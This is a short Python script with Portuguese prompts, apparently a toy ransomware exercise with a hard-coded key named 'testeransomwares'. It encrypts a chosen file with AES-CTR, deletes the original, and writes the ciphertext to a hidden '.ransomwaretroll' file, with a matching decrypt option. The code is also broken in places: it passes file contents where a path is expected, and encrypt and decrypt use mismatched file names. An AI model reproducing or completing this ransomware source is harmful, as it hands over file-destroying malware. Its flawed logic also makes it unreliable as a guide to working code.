from operator import truediv
import os
import pyaes

key = b"testeransomwares"

def encrypt_file(alvo, key):
    with open(alvo, "rb") as file:
        file_data = file.read()

    os.remove(alvo)

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)

def decrypt_file(alvo, key):
    with open(alvo, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    new_file_name = "decrypted_file.txt"
    with open(new_file_name, "wb") as new_file:
        new_file.write(decrypt_data)

    
    os.remove(alvo)

    
    os.rename(new_file_name, alvo)

    print(f"Arquivo descriptografado salvo como {alvo}")

def carregar_arquivo(caminho_do_arquivo):
    try:
        with open(caminho_do_arquivo, 'rb') as arquivo:
            conteudo = arquivo.read()
        return conteudo
    except FileNotFoundError:
        print(f"Arquivo nao encontrado: {caminho_do_arquivo}")
        return None
    except Exception as e:
        print(f"Erro ao carregar o arquivo: {e}")
        return None

def opcao_um(alvo):
    print("Voce escolheu Criptografar!")
    encrypt_file(alvo, key)

def opcao_dois(alvo):
    print("Voce escolheu a Descriptografar!")
    decrypt_file(alvo,key)

def menu(alvo):
    while True:
        print("Escolha uma opcao:")
        print("1. Criptografar")
        print("2. Descriptografar")

        escolha = input("Digite o numero da opcao desejada: ")

        if escolha == '1':
            opcao_um(alvo)
            break
        elif escolha == '2':
            opcao_dois(alvo)
            break
        else:
            print("Opcao invalida. Tente novamente.")

def receber_arquivo():
    while True:
        caminho_do_arquivo = input("Digite o caminho do arquivo: ")
        alvo = carregar_arquivo(caminho_do_arquivo)

        if alvo is not None:
            print(f"Conteudo do arquivo carregado com sucesso:\n{alvo}")
            menu(alvo)
            break
        else:
            print("Falha ao carregar o arquivo.")
            continue

receber_arquivo()
